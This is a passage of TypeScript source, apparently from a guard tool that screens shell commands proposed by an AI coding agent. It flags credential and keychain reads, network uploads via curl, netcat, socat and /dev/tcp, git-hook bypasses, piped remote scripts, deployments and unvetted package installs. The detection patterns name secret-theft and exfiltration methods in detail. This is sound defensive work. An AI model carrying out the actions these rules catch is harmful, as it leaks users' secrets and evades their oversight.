    if (name === 'gcloud' && args.includes('auth') && args.some((a) => /^print-(access|identity)-token$/.test(a))) return 'a Google Cloud token';
    if (name === 'az' && args[0] === 'account' && args[1] === 'get-access-token') return 'an Azure token';
    if (name === 'security' && /^(find-(generic|internet)-password|dump-keychain)$/.test(args[0] ?? '')) return 'a keychain password';
    if (name === 'secret-tool' && args[0] === 'lookup') return 'a keyring secret';
    if (name === 'pass' && (args[0] === 'show' || (args.length === 1 && !args[0]?.startsWith('-')))) return 'a password store entry';
    if (name === 'op' && (args[0] === 'read' || (args[0] === 'item' && args[1] === 'get'))) return 'a 1Password secret';
    if (name === 'bw' && args[0] === 'get') return 'a Bitwarden secret';
    if (name === 'vault' && (args[0] === 'read' || (args[0] === 'kv' && args[1] === 'get'))) return 'a Vault secret';
    if (name === 'doppler' && args[0] === 'secrets') return 'Doppler secrets';
    if (name === 'kubectl' && args[0] === 'get' && /^secrets?$/.test(args[1] ?? '')) return 'Kubernetes secrets';
    if (name === 'heroku' && (args[0] === 'config' || args[0] === 'auth:token')) return 'Heroku config vars';
    if (name === 'git' && args[0] === 'credential' && args[1] === 'fill') return 'git credentials';
    if (name === 'cat' && args.some((a) => /^\/proc\/[\w]+\/environ$/.test(a))) return 'a process environment';
    // Commands that read a file and print it.
    if (isReader(c, name) && name !== 'cp' && name !== 'copy-item' && name !== 'copy' && name !== 'cpi') {
      for (const f of this.readOperands(c, name, args)) {
        const s = sensitiveFile(f, this.pathCtxFor(c), { peek: true });
        if (s) return s.what;
      }
    }
    for (const r of c.redirects) {
      if ((r.op === '<' || r.op === '<>') && r.target) {
        const s = sensitiveFile(r.target.value, this.pathCtxFor(c), { peek: true });
        if (s) return s.what;
      }
    }
    return null;
  }

  /** Where a command sends data over the network, and whether it sends its stdin (or its own output). */
  private networkSink(c: ShellCommand): { where: string; readsStdin: boolean; selfOutput?: boolean } | null {
    const name = effectiveName(c);
    const argv = effectiveArgv(c);
    const args = argv.slice(1);
    const hostFrom = (urls: string[]) => {
      const host = urls.map(hostOf).find(Boolean) ?? null;
      return host;
    };
    for (const r of c.redirects) {
      if (/^(>|>>|>\||&>)$/.test(r.op) && r.target && /^\/dev\/(tcp|udp)\//.test(r.target.value)) {
        const host = r.target.value.split('/')[3] ?? 'a remote host';
        return isLocalHost(host) ? null : { where: host, readsStdin: true, selfOutput: true };
      }
    }
    const viaXargs = c.wrappers.some((w) => w.name === 'xargs');
    switch (name) {
      case 'curl': {
        const p = parseArgs(args, 0, CURL_VALUE_FLAGS);
        const host = hostFrom([...urlArgs(p.operands), ...(p.values.get('url') ?? [])]);
        if (host && isLocalHost(host)) return null;
        const bodies = ['d', 'data', 'data-binary', 'data-raw', 'data-urlencode', 'data-ascii', 'json', 'F', 'form', 'T', 'upload-file'].flatMap((k) => p.values.get(k) ?? []);
        const stdin = bodies.some((b) => b === '@-' || b === '-' || /=@-$|=<-$/.test(b) || b === '.') || viaXargs;
        return { where: host ?? 'a remote server', readsStdin: stdin };
      }
      case 'wget':
      case 'wget2': {
        const host = hostFrom(urlArgs(args));
        if (host && isLocalHost(host)) return null;
        const stdin = args.some((a) => /^--(post|body)-file=(-|\/dev\/stdin)$/.test(a)) || viaXargs;
        return { where: host ?? 'a remote server', readsStdin: stdin };
      }
      case 'http':
      case 'https':
      case 'xh':
      case 'xhs': {
        const host = hostFrom(urlArgs(args));
        if (!host || isLocalHost(host)) return null;
        return { where: host, readsStdin: !args.includes('--ignore-stdin') };
      }
      case 'nc':
      case 'ncat':
      case 'netcat':
      case 'telnet': {
        const operands = args.filter((a) => !a.startsWith('-'));
        const host = operands[0];
        if (!host || isLocalHost(host) || args.includes('-l')) return null;
        return { where: host, readsStdin: true };
      }
      case 'socat': {
        const remote = args.find((a) => /^(tcp|udp|openssl|ssl)[\w-]*:/i.test(a));
        if (!remote) return null;
        const host = remote.split(':')[1] ?? '';
        return isLocalHost(host) ? null : { where: host || 'a remote host', readsStdin: true };
      }
      case 'openssl':
        return args[0] === 's_client' ? { where: args.find((a) => /:\d+$/.test(a)) ?? 'a remote host', readsStdin: true } : null;
      case 'ssh': {
        const p = parseArgs(args, 0, new Set(['i', 'p', 'l', 'o', 'F', 'J', 'L', 'R', 'D', 'c', 'm', 'b', 'e', 'E', 'O', 'Q', 'S', 'w', 'W', 'B', 'I']));
        const host = p.operands[0];
        if (!host) return null;
        const bare = host.replace(/^.*@/, '');
        return isLocalHost(bare) ? null : { where: bare, readsStdin: true };
      }
      case 'scp':
      case 'sftp':
      case 'rsync': {
        const remote = args.find((a) => /^[\w.-]+@?[\w.-]*:/.test(a) && !/^[A-Za-z]:[\\/]/.test(a) && !a.startsWith('-'));
        if (!remote) return null;
        const host = remote.replace(/:.*$/, '').replace(/^.*@/, '');
        return isLocalHost(host) ? null : { where: host, readsStdin: false };
      }
      case 'gh': {
        if (args[0] === 'gist' && args[1] === 'create') return { where: 'a GitHub gist', readsStdin: args.slice(2).filter((a) => !a.startsWith('-')).length === 0 || args.includes('-') };
        if (args[0] === 'api') return { where: 'the GitHub API', readsStdin: args.includes('--input') && args[args.indexOf('--input') + 1] === '-' };
        if ((args[0] === 'issue' || args[0] === 'pr') && (args[1] === 'create' || args[1] === 'comment' || args[1] === 'edit')) return { where: `a GitHub ${args[0] === 'pr' ? 'pull request' : 'issue'}`, readsStdin: false };
        if (args[0] === 'release' && (args[1] === 'upload' || args[1] === 'create')) return { where: 'a GitHub release', readsStdin: false };
        return null;
      }
      case 'aws':
        if (args[0] === 's3' && (args[1] === 'cp' || args[1] === 'sync' || args[1] === 'mv') && args.some((a) => a.startsWith('s3://'))) return { where: 'an S3 bucket', readsStdin: args.includes('-') };
        return null;
      case 'gsutil':
        if (args.includes('cp') && args.some((a) => a.startsWith('gs://'))) return { where: 'a Cloud Storage bucket', readsStdin: args.includes('-') };
        return null;
      case 'mail':
      case 'mailx':
      case 'sendmail':
      case 'mutt':
        return { where: 'an email recipient', readsStdin: true };
      case 'invoke-webrequest':
      case 'iwr':
      case 'invoke-restmethod':
      case 'irm': {
        const host = hostFrom(urlArgs(args));
        if (host && isLocalHost(host)) return null;
        return { where: host ?? 'a remote server', readsStdin: false };
      }
      default:
        return null;
    }
  }

  /** Local files a network command uploads or sends. */
  private senderFiles(c: ShellCommand): string[] {
    const name = effectiveName(c);
    const args = effectiveArgv(c).slice(1);
    const files: string[] = [];
    for (const r of c.redirects) if ((r.op === '<' || r.op === '<>') && r.target) files.push(r.target.value);
    switch (name) {
      case 'curl': {
        const p = parseArgs(args, 0, CURL_VALUE_FLAGS);
        for (const k of ['d', 'data', 'data-binary', 'data-ascii', 'data-urlencode', 'json']) {
          for (const v of p.values.get(k) ?? []) {
            const m = /^(?:[^=@]*=)?@(.+)$/.exec(v);
            if (m && m[1] !== '-') files.push(m[1] as string);
          }
        }
        for (const v of [...(p.values.get('F') ?? []), ...(p.values.get('form') ?? [])]) {
          const m = /=[@<]([^;]+)/.exec(v);
          if (m && m[1] !== '-') files.push(m[1] as string);
        }
        for (const v of [...(p.values.get('T') ?? []), ...(p.values.get('upload-file') ?? [])]) if (v !== '-' && v !== '.') files.push(v);
        break;
      }
      case 'wget':
      case 'wget2':
        for (const a of args) {
          const m = /^--(?:post|body)-file=(.+)$/.exec(a);
          if (m && m[1] !== '-') files.push(m[1] as string);
        }
        break;
      case 'http':
      case 'https':
      case 'xh':
      case 'xhs':
        for (const a of args) {
          const m = /^(?:[\w-]+)?@(.+)$/.exec(a);
          if (m) files.push(m[1] as string);
        }
        break;
      case 'scp':
      case 'sftp':
      case 'rsync': {
        // Sources are every operand but the last; they are uploaded only when the destination is remote.
        const p = parseArgs(args, 0, new Set(['i', 'P', 'p', 'o', 'F', 'J', 'l', 'S', 'e', 'c']));
        const isRemote = (o: string) => /^[\w.-]+@?[\w.-]*:/.test(o) && !/^[A-Za-z]:[\\/]/.test(o);
        const dest = p.operands[p.operands.length - 1];
        if (dest && isRemote(dest)) for (const o of p.operands.slice(0, -1)) if (!isRemote(o)) files.push(o);
        break;
      }
      case 'gh': {
        if (args[0] === 'gist' && args[1] === 'create') files.push(...args.slice(2).filter((a) => !a.startsWith('-')));
        if (args[0] === 'release' && args[1] === 'upload') files.push(...args.slice(3).filter((a) => !a.startsWith('-')));
        for (let i = 0; i < args.length; i++) {
          if (args[i] === '--body-file' || args[i] === '-F' || args[i] === '--input') {
            const v = args[i + 1] ?? '';
            const m = /^(?:[\w-]+=)?@(.+)$/.exec(v);
            files.push(m ? (m[1] as string) : v);
          }
        }
        break;
      }
      case 'aws':
      case 'gsutil': {
        const operands = args.filter((a) => !a.startsWith('-'));
        files.push(...operands.filter((o) => !/^(s3|gs):\/\//.test(o) && !['s3', 'cp', 'sync', 'mv'].includes(o)));
        break;
      }
      case 'mutt':
        for (let i = 0; i < args.length; i++) if (args[i] === '-a') files.push(args[i + 1] ?? '');
        break;
      case 'invoke-webrequest':
      case 'iwr':
      case 'invoke-restmethod':
      case 'irm':
        for (let i = 0; i < args.length; i++) if (/^-infile$/i.test(args[i] as string)) files.push(args[i + 1] ?? '');
        break;
      default:
        break;
    }
    return files.filter(Boolean);
  }

  /** True when `inner` sits in a header argument of `sender` (curl -H "Authorization: Bearer $(...)"). */
  private isHeaderArgument(sender: ShellCommand, inner: ShellCommand): boolean {
    let direct: ShellCommand = inner;
    while (direct.parent && direct.parent !== sender) direct = direct.parent;
    const index = direct.parentWord;
    if (index === null || index < 1) return false;
    const prev = sender.argv[index - 1];
    const word = sender.argv[index] ?? '';
    return prev === '-H' || prev === '--header' || /^-H./.test(word) || /^--header=/.test(word) || /^[\w-]+:\S*\$\(/.test(word);
  }

  /** File operands a reading command reads. */
  private readOperands(c: ShellCommand, name: string, args: string[]): string[] {
    switch (name) {
      case 'grep':
      case 'egrep':
      case 'fgrep':
      case 'rg':
      case 'ag':
      case 'ack': {
        const p = parseArgs(args, 0, new Set(['e', 'f', 'm', 'A', 'B', 'C', 'max-count', 'regexp', 'file', 'context', 'after-context', 'before-context', 'g', 'glob', 't', 'type', 'T', 'M', 'max-columns']));
        if (['l', 'L', 'c', 'q', 'count', 'files-with-matches', 'files-without-match', 'quiet', 'silent'].some((f) => p.flags.has(f))) return [];
        if (p.flags.has('r') || p.flags.has('R') || p.flags.has('recursive')) return p.operands.filter((o) => sensitiveFile(o, this.pathCtxFor(c)) !== null);
        const patternGiven = p.values.has('e') || p.values.has('regexp') || p.values.has('f') || p.values.has('file');
        return patternGiven ? p.operands : p.operands.slice(1);
      }
      case 'awk':
      case 'gawk':
      case 'mawk': {
        const p = parseArgs(args, 0, new Set(['F', 'v', 'f']));
        return p.values.has('f') ? p.operands : p.operands.slice(1);
      }
      case 'sed': {
        const p = parseArgs(args, 0, new Set(['e', 'f', 'expression', 'file', 'l']));
        if (p.flags.has('i') || p.flags.has('in-place') || [...p.flags].some((f) => f.startsWith('i'))) return [];
        return p.values.has('e') || p.values.has('expression') || p.values.has('f') ? p.operands : p.operands.slice(1);
      }
      case 'cut': {
        const p = parseArgs(args, 0, new Set(['d', 'f', 'c', 'b', 'delimiter', 'fields']));
        const fields = [...(p.values.get('f') ?? []), ...(p.values.get('fields') ?? [])];
        if (fields.length > 0 && fields.every((f) => f === '1')) return []; // variable names only
        return p.operands;
      }
      case 'jq':
      case 'yq': {
        const p = parseArgs(args, 0, new Set(['arg', 'argjson', 'slurpfile', 'rawfile', 'indent', 'f', 'from-file', 'L']));
        return p.values.has('f') || p.values.has('from-file') ? p.operands : p.operands.slice(1);
      }
      case 'openssl': {
        const out: string[] = [];
        for (let i = 0; i < args.length; i++) if (args[i] === '-in') out.push(args[i + 1] ?? '');
        return /^(rsa|pkey|ec|dsa|pkcs8|pkcs12)$/.test(args[0] ?? '') ? out : [];
      }
      case 'tar': {
        const first = args[0] ?? '';
        const creating = /^-?[a-zA-Z]*c/.test(first) || args.includes('--create');
        if (!creating) return [];
        const p = parseArgs(args, 0, new Set(['f', 'C', 'file', 'directory']));
        return p.operands.filter((o) => !/^[a-zA-Z]+$/.test(o) || o.includes('.'));
      }
      case 'zip':
        return args.filter((a) => !a.startsWith('-')).slice(1);
      case 'get-content':
      case 'gc':
      case 'type':
      case 'select-string':
      case 'sls': {
        const out: string[] = [];
        for (let i = 0; i < args.length; i++) {
          const a = args[i] as string;
          if (/^-(path|literalpath|lp)$/i.test(a)) {
            out.push(args[i + 1] ?? '');
            i++;
          } else if (/^-(pattern|encoding|delimiter|totalcount|tail|head|first|last|readcount)$/i.test(a)) i++;
          else if (!a.startsWith('-')) out.push(a);
        }
        return name === 'select-string' || name === 'sls' ? out.slice(args.some((a) => /^-path$/i.test(a)) ? 0 : 1) : out;
      }
      case 'cp':
      case 'copy-item':
      case 'copy':
      case 'cpi': {
        const p = parseArgs(args, 0, new Set(['t', 'target-directory', 'S', 'suffix']));
        if (p.values.has('t') || p.values.has('target-directory')) return p.operands;
        return p.operands.slice(0, -1);
      }
      case 'diff':
      case 'cmp':
        return name === 'diff' ? parseArgs(args, 0, new Set(['U', 'C', 'x', 'X', 'I'])).operands : [];
      default:
        return parseArgs(args, 0, new Set(['n', 'c', 'w', 's', 'l', 'k', 't', 'o', 'N'])).operands;
    }
  }

  // -------------------------------------------------------------------------
  // agent/verification-bypass

  verificationBypass(): Hit[] {
    const out: Hit[] = [];
    const rule = 'agent/verification-bypass';
    const commands = this.parse.commands;
    const gitHookCommand = (c: ShellCommand) => {
      const git = gitInvocation(c);
      return git !== null && ['commit', 'push', 'merge', 'rebase', 'am', 'cherry-pick', 'revert'].includes(git.sub);
    };
    for (const c of commands) {
      const git = gitInvocation(c);
      if (git) {
        const shown = this.shown(c);
        const hooksPathConfig = git.configs.find((cfg) => /^core\.hookspath=/i.test(cfg));
        if (hooksPathConfig) {
          out.push(this.hit(rule, 'deny', `\`${shown}\` points core.hooksPath somewhere else, so the project's git hooks do not run.`, 'Run the command without -c core.hooksPath and fix what the hooks report.', [c]));
          continue;
        }
        if (['commit', 'push', 'merge', 'rebase', 'am'].includes(git.sub)) {
          const p = parseArgs(git.args, 0, git.sub === 'commit' ? new Set(['m', 'F', 'c', 'C', 't', 'message', 'file', 'reuse-message', 'reedit-message', 'template', 'author', 'date', 'fixup', 'squash', 'cleanup', 'trailer', 'pathspec-from-file']) : new Set(['o', 'push-option', 'm', 'X', 's', 'strategy', 'strategy-option', 'onto', 'x', 'exec']));
          const noVerify = p.flags.has('no-verify') || (git.sub === 'commit' && p.flags.has('n'));
          if (noVerify) {
            out.push(this.hit(rule, 'deny', `\`${shown}\` skips the git hooks (--no-verify), which run the project's checks.`, 'Run the command without --no-verify and fix what the hooks report; if a hook is broken, tell the user.', [c]));
            continue;
          }
        }
        if (git.sub === 'config') {
          const operands = git.args.filter((a) => !a.startsWith('-'));
          const unset = git.args.some((a) => a === '--unset' || a === '--unset-all' || a === '--remove-section');
          const newSyntaxSet = operands[0] === 'set' || operands[0] === 'unset';
          const keyIndex = newSyntaxSet ? 1 : 0;
          const key = operands[keyIndex]?.toLowerCase();
          const setting = operands.length > keyIndex + 1 || unset || operands[0] === 'unset';
          if (key === 'core.hookspath' && setting && !git.args.includes('--get') && !git.args.includes('--get-all')) {
            out.push(this.hit(rule, 'deny', `\`${shown}\` changes core.hooksPath, which decides whether the project's git hooks run.`, 'Leave core.hooksPath as it is; ask the user if the hooks setup needs to change.', [c]));
          }
        }
        continue;
      }
      // pre-commit uninstall, lefthook uninstall, husky uninstall
      const name = effectiveName(c);
      const args = effectiveArgv(c).slice(1);
      if ((name === 'pre-commit' || name === 'lefthook' || name === 'husky') && args[0] === 'uninstall') {
        out.push(this.hit(rule, 'deny', `\`${this.shown(c)}\` removes the project's git hooks.`, 'Leave the git hooks installed; ask the user if they need to change.', [c]));
        continue;
      }
      // Writes to .git/hooks
      for (const target of this.writeTargets(c)) {
        const resolved = resolveUserPath(target, this.pathCtxFor(c));
        if (resolved.rel !== null && /(^|\/)\.git\/hooks(\/|$)/.test(resolved.rel)) {
          out.push(this.hit(rule, 'deny', `\`${this.shown(c)}\` changes ${target}, a git hook that runs the project's checks.`, 'Leave the git hooks as they are; ask the user if a hook needs to change.', [c]));
          break;
        }
      }
    }
    // HUSKY=0 git commit, export SKIP=eslint && git commit
    const skipVar = (name: string, value: string) =>
      (name === 'HUSKY' && /^(0|false)$/i.test(value)) ||
      (name === 'HUSKY_SKIP_HOOKS' && /^(1|true)$/i.test(value)) ||
      (name === 'LEFTHOOK' && /^(0|false)$/i.test(value)) ||
      (name === 'LEFTHOOK_EXCLUDE' && value !== '') ||
      (name === 'SKIP' && value !== '') ||
      (name === 'SKIP_SIMPLE_GIT_HOOKS' && /^(1|true)$/i.test(value)) ||
      (name === 'OVERCOMMIT_DISABLE' && /^(1|true)$/i.test(value));
    for (const c of commands) {
      const direct = c.assignments.find((a) => skipVar(a.name, a.value));
      if (direct && gitHookCommand(c)) {
        out.push(this.hit(rule, 'deny', `\`${this.shown(c)}\` sets ${direct.name}=${direct.value}, which skips git hooks.`, `Run the git command without ${direct.name} and fix what the hooks report.`, [c]));
        continue;
      }
      const exported =
        c.name === 'export'
          ? c.argv
              .slice(1)
              .map((a) => ({ name: a.split('=')[0] as string, value: a.includes('=') ? a.slice(a.indexOf('=') + 1) : '' }))
              .find((a) => skipVar(a.name, a.value))
          : undefined;
      if (exported && commands.some((g) => g.index > c.index && gitHookCommand(g))) {
        out.push(this.hit(rule, 'deny', `\`${this.shown(c)}\` sets ${exported.name}=${exported.value} before a git command, which skips git hooks.`, `Remove ${exported.name} and fix what the hooks report.`, [c]));
      }
    }
    return out;
  }

  /** Files a command writes: redirect targets, tee, sed -i, cp/mv destinations, rm operands. */
  private writeTargets(c: ShellCommand): string[] {
    const out: string[] = [];
    for (const r of c.redirects) if (/^(>|>>|>\||&>|&>>|<>)$/.test(r.op) && r.target && !/^\/dev\//.test(r.target.value) && !/^&?\d$/.test(r.target.value)) out.push(r.target.value);
    const name = effectiveName(c);
    const args = effectiveArgv(c).slice(1);
    switch (name) {
      case 'tee':
        out.push(...parseArgs(args, 0).operands);
        break;
      case 'sed': {
        const p = parseArgs(args, 0, new Set(['e', 'f', 'expression', 'file', 'l']));
        if (p.flags.has('i') || p.flags.has('in-place') || [...p.flags].some((f) => f.startsWith('in-place'))) out.push(...(p.values.has('e') || p.values.has('expression') || p.values.has('f') ? p.operands : p.operands.slice(1)));
        break;
      }
      case 'perl': {
        if (args.some((a) => /^-[a-zA-Z]*i/.test(a))) out.push(...args.filter((a) => !a.startsWith('-')).slice(1));
        break;
      }
      case 'cp':
      case 'mv':
      case 'install':
      case 'ln': {
        const p = parseArgs(args, 0, new Set(['t', 'target-directory', 'S', 'suffix', 'm', 'mode', 'o', 'owner', 'g', 'group']));
        const dest = (p.values.get('t') ?? p.values.get('target-directory'))?.[0] ?? p.operands[p.operands.length - 1];
        const sources = p.values.has('t') || p.values.has('target-directory') ? p.operands : p.operands.slice(0, -1);
        if (dest && sources.length > 0) {
          out.push(dest);
          for (const s of sources) out.push(`${dest.replace(/\/$/, '')}/${s.slice(s.lastIndexOf('/') + 1)}`);
          if (name === 'mv') out.push(...sources);
        }
        break;
      }
      case 'rm':
      case 'unlink':
      case 'rimraf':
      case 'shred':
      case 'truncate':
      case 'chmod':
        out.push(...parseArgs(args, 0, new Set(['s', 'size', 'n', 'iterations', 'reference'])).operands.filter((o) => !(name === 'chmod' && /^[0-7]{3,4}$|^[ugoa]*[+=-][rwxXst]*$/.test(o))));
        break;
      case 'set-content':
      case 'sc':
      case 'add-content':
      case 'ac':
      case 'out-file':
      case 'new-item':
      case 'ni':
      case 'remove-item':
      case 'ri':
      case 'del':
      case 'erase': {
        for (let i = 0; i < args.length; i++) {
          const a = args[i] as string;
          if (/^-(path|literalpath|filepath|lp)$/i.test(a)) {
            out.push(args[i + 1] ?? '');
            i++;
          } else if (/^-(value|encoding|itemtype|type|name)$/i.test(a)) i++;
          else if (!a.startsWith('-') && out.length === 0) out.push(a);
        }
        break;
      }
      case 'copy-item':
      case 'cpi':
      case 'copy':
      case 'move-item':
      case 'mi':
      case 'move': {
        const dest = (() => {
          const i = args.findIndex((a) => /^-destination$/i.test(a));
          if (i >= 0) return args[i + 1];
          const positional = args.filter((a) => !a.startsWith('-'));
          return positional[1];
        })();
        if (dest) out.push(dest);
        break;
      }
      default:
        break;
    }
    return out.filter(Boolean);
  }

  // -------------------------------------------------------------------------
  // agent/remote-script

  remoteScript(): Hit[] {
    return findRemoteExecution(this.parse).map((e) => {
      const host = e.source ? (urlArgs(effectiveArgv(e.source)).map(hostOf).find(Boolean) ?? null) : null;
      const upstream = e.source !== null && isUpstream(e.source, e.command);
      const shown = upstream && e.source ? `${this.shown(e.source)} | ${this.shown(e.command)}` : this.shown(e.command);
      const from = host ? `code downloaded from ${host}` : 'downloaded code';
      let reason: string;
      if (e.kind === 'download-run' && e.source) reason = `\`${this.shown(e.source)}\` downloads a script that \`${this.shown(e.command)}\` then runs without review.`;
      else if (e.remote) reason = `\`${shown}\` runs ${from} without review.`;
      else reason = `\`${shown}\` ${describeRemoteExec(e)}, which hides what actually runs.`;
      return this.hit(
        'agent/remote-script',
        'ask',
        reason,
        e.remote ? 'Download the script to a file, show it to the user, and run it only after they approve; prefer a package manager or a pinned release.' : 'Run the plain command instead so the user can see what it does.',
        e.source ? [e.command, e.source] : [e.command],
      );
    });
  }

  // -------------------------------------------------------------------------
  // agent/publish-or-deploy

  publishOrDeploy(): Hit[] {
    const out: Hit[] = [];
    for (const c of this.parse.commands) {
      const found = publishAction(effectiveName(c), effectiveArgv(c).slice(1));
      if (found) out.push(this.hit('agent/publish-or-deploy', 'ask', `\`${this.shown(c)}\` ${found}.`, 'Ask the user to confirm the release or deployment, or let CI do it from a reviewed commit.', [c]));
    }
    return out;
  }

  // -------------------------------------------------------------------------
  // secret/read-sensitive-file (shell form)

  sensitiveReads(): Hit[] {
    const out: Hit[] = [];
    const seen = new Set<string>();
    for (const c of this.parse.commands) {
      if (this.loadsEnvironment(c) || this.outputConsumed(c)) continue;
      const name = effectiveName(c);
      const args = effectiveArgv(c).slice(1);
      const files: string[] = [];
      if (isReader(c, name)) files.push(...this.readOperands(c, name, args));
      for (const r of c.redirects) if ((r.op === '<' || r.op === '<>') && r.target) files.push(r.target.value);
      for (const raw of files) {
        const f = this.expand(raw, c);
        if (f === null) continue;
        const s = sensitiveFile(f, this.pathCtxFor(c), { peek: true });
        if (!s || seen.has(s.path.abs) || readAllowed(f, this.pathCtxFor(c))) continue;
        seen.add(s.path.abs);
        out.push({ verdict: readVerdict(s, this.shown(c)), commands: [c] });
      }
    }
    return out;
  }

  /**
   * The command's output never reaches the transcript: it is used inside a
   * substitution by a command that does not print its arguments, or its
   * pipeline ends in a command that only counts or hashes.
   */
  private outputConsumed(c: ShellCommand): boolean {
    if (c.origin === 'substitution' || c.origin === 'process-substitution') {
      const owner = c.parent;
      if (owner && !['echo', 'printf', 'print', 'cat', 'write-output', 'write-host', 'tee'].includes(owner.name.toLowerCase())) return true;
    }
    const last = this.parse.commands.filter((d) => d !== c && isUpstream(c, d)).sort((a, b) => b.index - a.index)[0];
    if (last) {
      const name = last.name;
      const args = last.argv.slice(1);
      if (['wc', 'md5sum', 'sha1sum', 'sha256sum', 'sha512sum', 'shasum', 'cksum', 'b2sum'].includes(name)) return true;
      if ((name === 'grep' || name === 'rg') && args.some((a) => /^-[a-zA-Z]*[cqlL]/.test(a) || a === '--count' || a === '--quiet')) return true;
    }
    return false;
  }

  /** `export $(cat .env | xargs)`, `env $(cat .env) node x`, `eval "$(cat .env)"`: loading variables, not printing them. */
  private loadsEnvironment(c: ShellCommand): boolean {
    let p: ShellCommand | null = c;
    while (p && (p.origin === 'substitution' || p.origin === 'process-substitution')) {
      const owner: ShellCommand | null = p.parent;
      if (!owner) return false;
      if (p.parentWord === -1 || p.parentWord === 0) return true;
      if (ENV_LOADERS.has(owner.name)) return true;
      p = owner;
    }
    return false;
  }

  // -------------------------------------------------------------------------
  // agent/protected-path-write (shell form)

  protectedWrites(): Hit[] {
    const out: Hit[] = [];
    const seen = new Set<string>();
    for (const c of this.parse.commands) {
      for (const raw of this.writeTargets(c)) {
        const target = this.expand(raw, c);
        if (target === null) continue;
        const p = protectedPath(target, this.pathCtxFor(c));
        if (!p || seen.has(p.path.abs)) continue;
        if (p.path.rel !== null && /(^|\/)\.git\/hooks(\/|$)/.test(p.path.rel)) continue; // verification-bypass reports it
        if (writeAllowed(target, this.pathCtxFor(c))) continue;
        seen.add(p.path.abs);
        out.push({ verdict: writeVerdict(p, this.shown(c)), commands: [c] });
      }
    }
    return out;
  }

  // -------------------------------------------------------------------------
  // agent/package-install

  async packageInstall(vet: (specs: readonly string[]) => Promise<PackageVerdict[]>): Promise<Hit[]> {
    const requests: Array<{ c: ShellCommand; specs: string[] }> = [];
    for (const c of this.parse.commands) {
      const specs = this.installedSpecs(c).filter(isRegistrySpec);
      if (specs.length > 0) requests.push({ c, specs });
    }
    if (requests.length === 0) return [];
    const all = [...new Set(requests.flatMap((r) => r.specs.map(registryName)))];
    const verdicts = await vet(all);
    const out: Hit[] = [];
    for (const v of verdicts) {
      if (v.decision === 'allow') continue;
      const req = requests.find((r) => r.specs.some((s) => registryName(s) === v.spec || stripVersion(registryName(s)) === v.name)) ?? requests[0];
      if (!req) continue;
      const why = v.reason ? v.reason.replace(/\.$/, '') : `${v.rule ?? 'a package check'} failed`;
      out.push(
        this.hit(
          'agent/package-install',
          v.decision === 'deny' ? 'deny' : 'ask',
          `\`${this.shown(req.c)}\` installs ${v.spec}: ${why}${v.rule ? ` (${v.rule})` : ''}.`,
          'Check the name and publisher on the registry; if it is the right package, a person can approve the install or add it to packages.allow in ubon.json.',
          [req.c],
        ),
      );
    }
    return out;
  }

  /** Package specs a command installs or runs from the registry. */
  private installedSpecs(c: ShellCommand): string[] {
    const out: string[] = [];
    for (const w of c.wrappers) {
      if (!w.packages || w.packages.length === 0) continue;
      for (const spec of w.packages) if (!this.locallyAvailable(stripVersion(spec), c)) out.push(spec);
    }
    const name = c.name;
    const args = c.argv.slice(1);
    const sub = args[0];
    const operands = (from: number, valueFlags: ReadonlySet<string>) => parseArgs(args, from, valueFlags).operands;
    if (name === 'npm') {
      if (sub && /^(install|i|in|ins|inst|insta|instal|isnt|isnta|isntal|isntall|add)$/.test(sub)) {
        if (args.includes('--registry')) return out;
        out.push(...operands(1, NPM_VALUE_FLAGS));
      } else if (sub === 'create' || sub === 'init') {
        const target = operands(1, NPM_VALUE_FLAGS)[0];
        if (target) out.push(createPackage(target));
      }
    } else if (name === 'pnpm') {
      if (sub === 'add' || ((sub === 'install' || sub === 'i') && args.length > 1)) out.push(...operands(1, PNPM_VALUE_FLAGS));
      else if (sub === 'create') {
        const target = operands(1, PNPM_VALUE_FLAGS)[0];
        if (target) out.push(createPackage(target));
      }
    } else if (name === 'yarn') {
      if (sub === 'add') out.push(...operands(1, YARN_VALUE_FLAGS));
      else if (sub === 'global' && args[1] === 'add') out.push(...operands(2, YARN_VALUE_FLAGS));
      else if (sub === 'create') {
        const target = operands(1, YARN_VALUE_FLAGS)[0];
        if (target) out.push(createPackage(target));
      }
    } else if (name === 'bun') {
      if (sub === 'add' || sub === 'a' || ((sub === 'install' || sub === 'i') && args.length > 1)) out.push(...operands(1, BUN_VALUE_FLAGS));
      else if (sub === 'create' || sub === 'c') {
        const target = operands(1, BUN_VALUE_FLAGS)[0];
        if (target && !target.includes('/')) out.push(createPackage(target));
      }
    }
    return out;
  }

  /** A package is available without a download when its binary is in node_modules/.bin or it is a declared dependency. */
  private locallyAvailable(name: string, c: ShellCommand): boolean {
    const bin = name.startsWith('@') ? name.slice(name.indexOf('/') + 1) : name;
    let dir = resolve(this.cwd(c) ?? this.ctx.cwd);
    const root = resolve(this.ctx.root);
    for (let guard = 0; guard < 40; guard++) {
      if (existsSync(join(dir, 'node_modules', '.bin', bin)) || existsSync(join(dir, 'node_modules', name, 'package.json'))) return true;
      const pkg = join(dir, 'package.json');
      if (existsSync(pkg)) {
        try {
          const json = JSON.parse(readFileSync(pkg, 'utf8')) as Record<string, unknown>;
          for (const field of ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies']) {
            const deps = json[field];
            if (deps && typeof deps === 'object' && Object.hasOwn(deps, name)) return true;
          }
        } catch {
          // unreadable package.json: keep looking
        }
      }
      if (dir === root || !dir.startsWith(root)) break;
      const parent = dirname(dir);
      if (parent === dir) break;
      dir = parent;
    }
    return false;
  }
}

const NPM_VALUE_FLAGS = new Set(['w', 'workspace', 'prefix', 'registry', 'tag', 'omit', 'include', 'cache', 'userconfig', 'install-strategy', 'save-prefix', 'before', 'loglevel', 'C']);
const PNPM_VALUE_FLAGS = new Set(['filter', 'F', 'C', 'dir', 'registry', 'reporter', 'config', 'store-dir', 'virtual-store-dir', 'modules-dir']);
const YARN_VALUE_FLAGS = new Set(['cwd', 'registry', 'network-timeout', 'mutex', 'modules-folder', 'cache-folder']);
const BUN_VALUE_FLAGS = new Set(['cwd', 'registry', 'backend', 'cache-dir', 'c', 'config']);

/** `npm create vite` runs create-vite; `npm init @scope` runs @scope/create. */
function createPackage(target: string): string {
  if (target.startsWith('@')) {
    const slash = target.indexOf('/');
    if (slash === -1) return `${target}/create`;
    return `${target.slice(0, slash)}/create-${target.slice(slash + 1)}`;
  }
  return `create-${target}`;
}

function isRegistrySpec(spec: string): boolean {
  if (!spec || spec.startsWith('-')) return false;
  if (/^(\.{1,2}\/|\/|~|[A-Za-z]:[\\/])/.test(spec) || spec === '.' || spec === '..') return false;
  if (/^(file|link|portal|patch|workspace|catalog|git|git\+[a-z]+|github|gitlab|bitbucket|gist|https?|ssh):/.test(spec)) return false;
